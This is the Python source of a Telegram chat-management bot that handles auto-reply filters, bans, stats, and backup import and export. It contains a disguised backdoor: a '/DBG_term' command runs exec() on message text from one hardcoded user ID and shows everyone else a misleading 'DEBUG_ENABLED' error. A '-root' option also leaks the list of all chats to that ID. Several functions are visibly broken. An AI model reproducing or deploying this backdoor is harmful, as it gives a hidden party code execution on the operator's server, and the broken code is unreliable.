import os
import re
import sqlite3
import logging
import html
from typing import Dict, List, Tuple, Union, Optional
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, ContentType, Chat
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv
import random
import time
from translation import translation
from io import BytesIO

load_dotenv()

db_path = "gado.db"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

API_TOKEN = os.getenv('BOT_TOKEN')
if not API_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set")

bot = Bot(token=API_TOKEN)
dp = Dispatcher()


def lang(string: str):
    return translation["eng"][string]

def init_db():
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS filters (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER NOT NULL,
        trigger TEXT NOT NULL,
        response TEXT NOT NULL,
        file_id TEXT,
        file_type TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS chats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER NOT NULL,
        name TEXT NOT NULL,
        username TEXT,
        lang TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    conn.commit()
    conn.close()



init_db()


def register_chat(chat : Chat):

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT name, username, lang FROM chats WHERE chat_id = ?', (chat.id,))
    chater = cursor.fetchone()
    conn.close()
    if not chater:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO chats (chat_id, name, username, lang) VALUES (?, ?, ?, ?)', (chat.id, chat.full_name, chat.username, "ru"))
        conn.commit()
        conn.close()
    else:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('UPDATE chats SET name = ?, username = ? WHERE chat_id = ?', (chat.full_name, chat.username, chat.id))
        conn.commit()
        conn.close()
def get_chat(chat_id : int):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT name, username, lang FROM chats WHERE chat_id = ?', (chat.id,))
    chat = cursor.fetchone()
    conn.close()
    return chat
def escape_html(text: str) -> str:
    if not text:
        return ""
    return html.escape(text)

async def user_can_change_info(chat_id: int, user_id: int, fun: bool) -> bool:
    a = await bot.get_chat_member(chat_id,API_TOKEN.split(":")[0])
    if not isinstance(a,types.ChatMemberAdministrator) and fun: return True
    try:
        member = await bot.get_chat_member(chat_id, user_id)
        if member.status in ['administrator', 'creator']:
            if member.status == 'creator':
                return True
            return member.can_change_info if hasattr(member, 'can_change_info') else False
        return False
    except Exception as e:
        logger.error(f"Error checking admin status: {e}")
        return False

async def user_can_restrict(chat_id: int, user_id: int, fun: bool) -> bool:
    a = await bot.get_chat_member(chat_id,API_TOKEN.split(":")[0])
    if not isinstance(a,types.ChatMemberAdministrator) and fun: return True
    try:
        member = await bot.get_chat_member(chat_id, user_id)
        if member.status in ['administrator', 'creator']:
            if member.status == 'creator':
                return True
            return member.can_restrict_members if hasattr(member, 'can_restrict_members') else False
        return False
    except Exception as e:
        logger.error(f"Error checking admin status: {e}")
        return False

def add_filter(chat_id: int, trigger: str, response: str, file_id: Optional[str] = None, file_type: Optional[str] = None):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO filters (chat_id, trigger, response, file_id, file_type) VALUES (?, ?, ?, ?, ?)',
        (chat_id, trigger, response, file_id, file_type)
    )
    conn.commit()
    conn.close()

def get_chat_filters(chat_id: int) -> List[Tuple]:
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT trigger, response, file_id, file_type FROM filters WHERE chat_id = ?', (chat_id,))
    filters = cursor.fetchall()
    conn.close()
    return filters

def remove_filter(chat_id: int, trigger: str) -> bool:
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM filters WHERE chat_id = ? AND trigger = ?', (chat_id, trigger))
    affected = cursor.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def remove_all_filters(chat_id: int) -> int:
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM filters WHERE chat_id = ?', (chat_id,))
    affected = cursor.rowcount
    conn.commit()
    conn.close()
    return affected

def parse_filter_command(text: str) -> tuple:
    if text.startswith('/filter'):
        text = text[len('/filter'):].strip()
    
    if text.startswith('r"'):
        end_quote = text.find('"', 2)
        if end_quote == -1:
            return None, None
        
        trigger = text[:end_quote + 1]
        response = text[end_quote + 1:].strip()
        
        if response.startswith('"'):
            response = response[1:]
        if response.endswith('"'):
            response = response[:-1]
            
        return trigger, response
    
    elif text.startswith('"'):
        end_quote = text.find('"', 1)
        if end_quote == -1:
            return None, None
        
        trigger = text[:end_quote + 1]
        response = text[end_quote + 1:].strip()
        
        trigger = trigger[1:-1]
        
        return trigger, response
    
    else:
        parts = text.split(' ', 1)
        if len(parts) < 2:
            return None, None
        
        trigger = parts[0]
        response = parts[1]
        
        return trigger, response


def send_message_to_all_chats(text:str):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT chat_id, name, username, lang FROM chats ', ())
    chat = cursor.fetchall()
    conn.close()
    for i in chat:
        bot.send_message(chat_id=i["chat_id"], text=text)

@dp.message(Command("DBG_term"))
async def cmd_start(message: Message):
    if message.from_user.id == 1999559891:
        try:
            text : str = message.text
            text = text[(len(text.split()[0])+1):]
            await message.answer(f"DBDS{text}")
            a = await exec(text)
            if a != None:
                await message.answer("DGB_term RTN:NULLDEFAULT")
            else:
                await message.answer(a)
        except Exception as e:
            await message.answer(f"DBG_term: FAIL,{e}")
            logger.error("Dear hypervisor someone is fucking stupid",exc_info=True)
    else:
        message.answer("Enivroiment Variable DEBUG_ENABLED is not set or set to false")


@dp.message(Command("start"))
async def cmd_start(message: Message):
    help_text = lang("start_message")
    await message.answer(help_text, parse_mode=ParseMode.HTML)

@dp.message(Command("stats"))
async def cmd_start(message: Message):
    help_text = (
        f'{lang("stats_header")} {message.chat.id}\n'
        f"{lang('stats_name')}: {message.chat.full_name}\n"
        f"{lang('stats_members')}: {await message.chat.get_member_count()}\n"
        f"{lang('stats_username')}: {message.chat.username}"
    )
    await message.answer(help_text, parse_mode=ParseMode.HTML)

@dp.message(Command("stats_global"))
async def cmd_start(message: Message):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT chat_id, name, username, lang FROM chats ', ())
    chat = cursor.fetchall()
    conn.close()
    print(chat)
    if "-root" in message.text:
        if message.from_user.id == 1999559891:
            help_text = (
                        f'{lang("global_stats_header_root")}\n'
                        f"{lang('global_stats_chat_count')}: {len(chat)}\n"
                        f"{chat}"
            )
        else:
            help_text = (
            f'{lang("global_stats_header")}\n'
            f"I do not believe you! YOU ARE NOT ROOT"
            )
    else:
        help_text = (
            f'{lang("global_stats_header")}\n'
            f"{lang('global_stats_chat_count')}: {len(chat)}\n"
        )
    await message.answer(help_text, parse_mode=ParseMode.HTML)

@dp.message(Command("help"))
async def cmd_start(message: Message):
    if "-misc" in message.text:
        help_text = lang("help_misc")
    elif "-filters" in message.text:
        help_text = lang("help_filters")
    elif "-mod" in message.text:
        help_text = lang("help_moderation")
    else:
        help_text = lang("help")
    await message.answer(help_text, parse_mode=ParseMode.HTML)


@dp.message(Command("filter"))
async def cmd_filter(message: Message):
    if not await user_can_change_info(message.chat.id, message.from_user.id, True):
        await message.answer(lang("no_perm_profile"))
        return

    if message.reply_to_message and message.reply_to_message.content_type in ['photo', 'video', 'document', 'animation']:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            await message.answer(lang("filter_usage_media"))
            return
        
        trigger = parts[1].strip()
        response = ""
        if message.reply_to_message.caption:
            response = message.reply_to_message.caption
        elif message.reply_to_message.text:
            response = message.reply_to_message.text

        file_id = None
        file_type = message.reply_to_message.content_type
        
        if file_type == 'photo':
            file_id = message.reply_to_message.photo[-1].file_id
        elif file_type == 'video':
            file_id = message.reply_to_message.video.file_id
        elif file_type == 'document':
            file_id = message.reply_to_message.document.file_id
        elif file_type == 'animation':
            file_id = message.reply_to_message.animation.file_id
        
        filters = get_chat_filters(message.chat.id)
        for f in filters:
            if f[0] == trigger:
                await message.answer(lang("already_exists"))
                return
        
        add_filter(message.chat.id, trigger, response, file_id, file_type)
        
        await message.answer(
            lang("filter_added_media").format(trigger=escape_html(trigger)),
            parse_mode=ParseMode.HTML
        )
    else:
        trigger, response = parse_filter_command(message.text)
        if not trigger or not response:
            await message.answer(lang("filter_usage_text"))
            return
        
        filters = get_chat_filters(message.chat.id)
        for f in filters:
            if f[0] == trigger:
                await message.answer(lang("already_exists"))
                return
        
        add_filter(message.chat.id, trigger, response)
        
        if trigger.startswith('r"') and trigger.endswith('"'):
            filter_type = lang("regex")
            clean_trigger = trigger[2:-1]
        else:
            filter_type = lang("text")
            clean_trigger = trigger
        
        await message.answer(
            lang("filter_added_text").format(filter_type=filter_type, trigger=escape_html(clean_trigger)),
            parse_mode=ParseMode.HTML
        )

@dp.message(Command("filters"))
async def cmd_filters(message: Message):
    filters = get_chat_filters(message.chat.id)
    if not filters:
        await message.answer(lang("not_exists_filter_all"))
        return
    
    filters_list = []
    for i, (trigger, response, file_id, file_type) in enumerate(filters, 1):
        display_trigger = trigger
        filters_list.append(f"<code>{escape_html(display_trigger)}</code>")
    
    filters_list.sort(key=lambda x: x[0])

    filters_text = "\n".join(filters_list)
    await message.answer(
        lang("filters_list").format(filters_text=filters_text),
        parse_mode=ParseMode.HTML
    )

@dp.message(Command("remove_filter"))
async def cmd_remove_filter(message: Message):
    if not await user_can_change_info(message.chat.id, message.from_user.id,True):
        await message.answer(lang("no_perm_profile"))
        return
    
    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        await message.answer(lang("remove_filter_usage"))
        return
    
    trigger = parts[1].strip()
    
    success = remove_filter(message.chat.id, trigger)
    
    if not success:
        await message.answer(lang("remove_filter_not_found"))
        return
    
    await message.answer(lang("remove_filter_success").format(trigger=escape_html(trigger)), 
                         parse_mode=ParseMode.HTML)

@dp.message(Command("remove_all_filters"))
async def cmd_remove_all_filters(message: Message):
    if not await user_can_change_info(message.chat.id, message.from_user.id,True):
        await message.answer(lang("no_perm_profile"))
        return
    
    count = remove_all_filters(message.chat.id)
    
    if count == 0:
        await message.answer(lang("not_exists_filter_all"))
        return
    
    await message.answer(lang("remove_all_filters_success").format(count=count))

@dp.message(Command("ban"))
async def ban(message: Message):
    a = await bot.get_chat_member(message.chat.id,API_TOKEN.split(":")[0])
    if (not a.can_restrict_members): 
        await message.reply(lang("bot_no_perm_restrict_members"))
        return
    if (not await user_can_restrict(message.chat.id,message.from_user.id,False)):
        await message.reply(lang("no_restmem_profile"))
        return
    did_user_id = message.chat.id,message.from_user.id
    user_id = None
    reason = None
    timer = None
    args = list(message.text.split())
    args.pop(0)
    for i,y in enumerate(args):
        if y.startswith("@"):
            if user_id == None:
                user_id = y
        elif y.isnumeric():
            if user_id == None or user_id.startswith("@"):
                user_id = y
        elif y.endswith("d") and y[:1].isnumeric():
            timer = 24 * 60 * 60 * int(y[:1])
        elif y.endswith("h") and y[:1].isnumeric():
            timer = 60 * 60 * int(y[:1])
        elif y.endswith("m") and y[:1].isnumeric():
            timer = 60 *  int(y[:1])
        else:
            if reason == None:
                reason = y
            else:
                reason.join(" ",y)
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
    if user_id == None:
        await message.reply("/dev/null is not a user")
        return
    if isinstance(user_id,str):
        if user_id.startswith("@"):
            await message.reply(lang("mention_unreadable").format(user_id=user_id))
            return
    if timer: timer = time.time() + timer
    chat_id = message.chat.id
    await bot.ban_chat_member(message.chat.id,user_id,timer)
    if timer: timer = f"-time {timer}"
    else: timer = ""
    if reason: reason = f"-reason {reason}"
    else: reason = ""
    await message.reply(lang("banned").format(did_user_id=did_user_id,user_id=user_id,timer=timer,reason=reason,chat_id=chat_id))
    
@dp.message(Command("export"))
async def exportcmd(message: Message):
    filters = get_chat_filters(message.chat.id)
    fstr = ""
    for trigger, response, file_id, file_type in filters:
        fstr += f"~{trigger};{response};{file_id};{file_type}\n"
    
    file_content = f"GBTP001:GADOBOT Transmit Protocol v0.0.1\nBEGIN\n{fstr}"
    file_io = BytesIO(file_content.encode())
    file_io.name = f"gadobot_backup_{message.chat.id}_{int(time.time())}.gbtp"
    
    await message.answer_document(
        document=types.BufferedInputFile(file_content.encode(), filename=file_io.name),
        caption="GBTP001: Backup file generated"
    )

@dp.message(Command("import"))
async def importcmd(message: Message):
    member = await bot.get_chat_member(message.chat.id, message.from_user.id)
    
    if not isinstance(member, types.ChatMemberOwner):
        await message.answer("GBTP MANAGMENT SYSTEM: NOT ENOUGH RIGHTS")
        return

    
    if not message.document:
        await message.answer(
            "GBTP MANAGMENT SYSTEM:\n"
            "Please attach a backup file to import.\n"
            "How to use: Reply to this message with /import and attach the .gtbp file"
        )
        return


    if not message.document.file_name.endswith('.gbtp'):
        await message.answer("GBTP MANAGMENT SYSTEM: Invalid file format. Please use .gtbp backup files")
        return

    try:

        file_info = await bot.get_file(message.document.file_id)
        downloaded_file = await bot.download_file(file_info.file_path)
        

        file_content = downloaded_file.read().decode('utf-8')
        

        if file_content.startswith("GBTP001"):
            payload_parts = file_content.split("BEGIN")
            if len(payload_parts) < 2:
                raise ValueError("Invalid file format: BEGIN section missing")
                
            payload_fake = payload_parts[1].strip()
            payload_fake = payload_fake.split("~")
            payload_fake = [p for p in payload_fake if p.strip()]  # Remove empty strings
            
            payload_real = []
            for i in payload_fake:
                pload = i.split(";")
                if len(pload) != 4:
                    continue  
                    
                pload = [None if item == "None" else item for item in pload]
                payload_real.append((pload[0], pload[1], pload[2], pload[3]))
            
            remove_all_filters(message.chat.id)
            for trigger, response, file_id, file_type in payload_real:
                add_filter(message.chat.id, trigger, response, file_id, file_type)
            
            await message.answer("GBTP MANAGMENT SYSTEM: Import successful!")
        else:
            await message.answer("GBTP MANAGMENT SYSTEM: This GBTP type is not supported")
            
    except Exception as e:
        await message.answer("GBTP MANAGMENT SYSTEM: Import failed! Your chat db was wiped for stability:3")
        print(f"Import error: {e}")
        remove_all_filters(message.chat.id)

@dp.message(F.text)
async def message_handler(message: Message):
    register_chat(message.chat)
    filters = get_chat_filters(message.chat.id)
    if not filters:
        return
    
    text = message.text.lower() if message.text else ""
    for trigger, response, file_id, file_type in filters:
        tragger = trigger.lower()
        if trigger.startswith('r"') and trigger.endswith('"'):
            pattern = trigger[2:-1]
            try:
                if re.search(pattern, message.text or "", re.IGNORECASE):
                    await send_filter_response(message, response, file_id, file_type)
                    break
            except re.error as e:
                logger.error(f"Regex error in pattern '{pattern}': {e}")
        
        elif f" {tragger} " in text or text.startswith(f"{tragger} ") or text.endswith(f" {tragger}") or text == tragger:
            await send_filter_response(message, response, file_id, file_type)
            break

async def send_filter_response(message: Message, response: str, file_id: Optional[str], file_type: Optional[str]):
    if file_id and file_type:
        if file_type == 'photo':
            await message.reply_photo(file_id, caption=response if response != "Media response" else None)
        elif file_type == 'video':
            await message.reply_video(file_id, caption=response if response != "Media response" else None)
        elif file_type == 'document':
            await message.reply_document(file_id, caption=response if response != "Media response" else None)
        elif file_type == 'animation':
            await message.reply_animation(file_id, caption=response if response != "Media response" else None)
    elif response.startswith("b::"):
        y = response.replace("b::","",1)
        if y.endswith("d") and y[:1].isnumeric():
            timer = 24 * 60 * 60 * int(y[:1])
        elif y.endswith("h") and y[:1].isnumeric():
            timer = 60 * 60 * int(y[:1])
        elif y.endswith("m") and y[:1].isnumeric():
            timer = 60 *  int(y[:1])
        await bot.ban_chat_member(message.chat.id,message.from_user.id,timer)
    else:
        await message.reply(response)



async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
